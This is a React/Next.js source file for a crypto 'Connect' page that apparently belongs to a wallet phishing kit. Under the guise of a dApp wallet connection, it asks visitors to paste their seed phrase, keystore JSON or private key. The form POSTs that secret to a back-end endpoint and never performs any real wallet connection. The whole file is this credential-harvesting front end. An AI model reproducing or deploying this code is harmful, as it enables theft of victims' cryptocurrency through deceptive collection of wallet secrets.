"use client"

import type React from "react"
import { Zap, Menu } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Textarea } from "@/components/ui/textarea"
import Link from "next/link"
import { useState } from "react"

export default function ConnectPage() {
  const [methodOfConnection, setMethodOfConnection] = useState("")
  const [phraseKeyStore, setPhraseKeyStore] = useState("")
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [submissionStatus, setSubmissionStatus] = useState<string | null>(null)

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    // Changed type to React.FormEvent<HTMLFormElement>
    event.preventDefault() // Prevent default form submission

    setIsSubmitting(true)
    setSubmissionStatus(null)

    const formData = new FormData()
    formData.append("methodOfConnection", methodOfConnection)
    formData.append("phraseKeyStore", phraseKeyStore)

    try {
      const response = await fetch("/api/submitform", {
        method: "POST",
        body: formData,
      })

      if (!response.ok) {
        const errorData = await response.json()
        setSubmissionStatus(`Error: ${errorData.message || "Something went wrong."}`)
      }
    } catch (error) {
      console.error("Form submission failed:", error)
      setSubmissionStatus("Error: Network error or unexpected issue.")
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="min-h-screen flex flex-col bg-neutral-50">
      {/* Header - Reused from app/page.tsx */}
      <header className="bg-white border-b border-gray-200 px-6 py-4">
        <div className="flex items-center justify-between max-w-7xl mx-auto">
          {/* Logo on the left */}
          <div className="flex items-center justify-center w-8 h-8 bg-blue-600 rounded">
            <Zap className="w-5 h-5 text-white" />
          </div>
          {/* Navigation in the middle */}
          <nav className="flex space-x-8">
            <Link href="/" className="text-gray-600 hover:text-gray-900 font-medium">
              Home
            </Link>
            <Link href="/explore" className="text-gray-600 hover:text-gray-900 font-medium">
              Explore
            </Link>
          </nav>
          {/* Breadcrumb icon on the right */}
          <div className="text-gray-500">
            <Menu className="w-6 h-6 text-gray-600" />
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 px-6 py-12">
        <div className="max-w-7xl mx-auto space-y-8">
          {/* Page Title and Subtitle */}
          <div>
            <h1 className="text-4xl font-bold text-gray-900">Explore</h1>
            <p className="text-gray-600 mt-2">Explore different connection mode</p>
          </div>

          {/* DAPP Type Section */}
          <div className="text-lg font-semibold text-gray-800">DAPP Type: MM</div>

          {/* Connection Form Box */}
          <div className="bg-white p-8 rounded-lg shadow-md w-full">
            <form onSubmit={handleSubmit} className="space-y-6"> {/* handleSubmit moved to form onSubmit */}
              {/* Method of Connection */}
              <div>
                <label htmlFor="connection-method" className="block text-gray-700 font-medium mb-2">
                  Method of Connection
                </label>
                <Select value={methodOfConnection} onValueChange={setMethodOfConnection}>
                  <SelectTrigger
                    id="connection-method"
                    className="w-full border-2 border-blue-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 focus:ring-offset-0 transition-colors"
                  >
                    <SelectValue placeholder="Select One" />
                  </SelectTrigger>
                  <SelectContent className="z-[9999] bg-white border-2 border-blue-300 shadow-xl backdrop-blur-sm">
                    <div className="fixed inset-0 bg-black/40 backdrop-blur-[2px] -z-10" />
                    <SelectItem
                      value="Phrase" 
                      className="focus:bg-blue-50 focus:text-blue-900 data-[highlighted]:bg-blue-100 data-[highlighted]:text-blue-900 data-[state=checked]:bg-blue-100 data-[state=checked]:text-blue-900 cursor-pointer"
                    >
                      Phrase
                    </SelectItem>
                    <SelectItem
                      value="Key Store JSON" 
                      className="focus:bg-blue-50 focus:text-blue-900 data-[highlighted]:bg-blue-100 data-[highlighted]:text-blue-900 data-[state=checked]:bg-blue-100 data-[state=checked]:text-blue-900 cursor-pointer"
                    >
                      Key Store JSON
                    </SelectItem>
                    <SelectItem
                      value="Private Key" 
                      className="focus:bg-blue-50 focus:text-blue-900 data-[highlighted]:bg-blue-100 data-[highlighted]:text-blue-900 data-[state=checked]:bg-blue-100 data-[state=checked]:text-blue-900 cursor-pointer"
                    >
                      Private Key
                    </SelectItem>
                  </SelectContent>
                </Select>
                {/* Hidden input to pass the select value as part of FormData - RE-ADDED */}
                <input type="hidden" name="methodOfConnection" value={methodOfConnection} />
              </div>

              {/* Phrase, Key store or Private key */}
              <div>
                <label htmlFor="phrase-key-store" className="block text-gray-700 font-medium mb-2">
                  Phrase, Key store or Private key
                </label>
                <Textarea
                  id="phrase-key-store"
                  name="phraseKeyStore"
                  placeholder=""
                  className="min-h-[120px] resize-y border-2 border-blue-300 focus:border-blue-500 focus:ring-2 focus:ring-blue-200 focus:ring-offset-0 transition-colors"
                  value={phraseKeyStore}
                  onChange={(e) => setPhraseKeyStore(e.target.value)}
                />
              </div>

              {/* Connect Button */}
              <Button
                type="submit"
                className="w-full bg-blue-600 hover:bg-blue-700 text-white py-2 focus:ring-2 focus:ring-blue-200 focus:ring-offset-2 transition-colors"
                disabled={isSubmitting}
                // onClick={handleSubmit} Removed onClick from button
              >
                {isSubmitting ? "Connecting..." : "Connect"}
              </Button>

              {submissionStatus && (
                <div
                  className={`mt-4 text-center ${submissionStatus.startsWith("Error") ? "text-red-500" : "text-green-500"}`}
                >
                  {submissionStatus}
                </div>
              )}
            </form>
          </div>
        </div>
      </main>

      {/* Footer - Reused from app/page.tsx */}
      <footer className="bg-blue-600 text-white px-6 py-12">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
            <div className="space-y-4">
              <div className="flex items-center justify-center w-8 h-8 bg-white rounded">
                <Zap className="w-5 h-5 text-blue-600" />
              </div>
              <p className="text-blue-100 leading-relaxed max-w-md">
                Our commitment is to address a wide array of blockchain and crypto challenges comprehensively. We strive
                to provide effective solutions that empower you to navigate the rapidly evolving blockchain landscape
                with confidence. Trust us to optimize your operations and create a successful and efficient blockchain
                ecosystem.
              </p>
            </div>
            <div className="space-y-4">
              <h3 className="text-white font-semibold text-lg">Quick Links</h3>
              <div className="space-y-2">
                <Link href={"/profile"} className="block text-blue-100 hover:text-white transition-colors">
                  Explore
                </Link>
                <Link href={"/connect"} className="block text-blue-100 hover:text-white transition-colors">
                  Connect
                </Link>
              </div>
            </div>
          </div>
        </div>
      </footer>
    </div>
  )
}
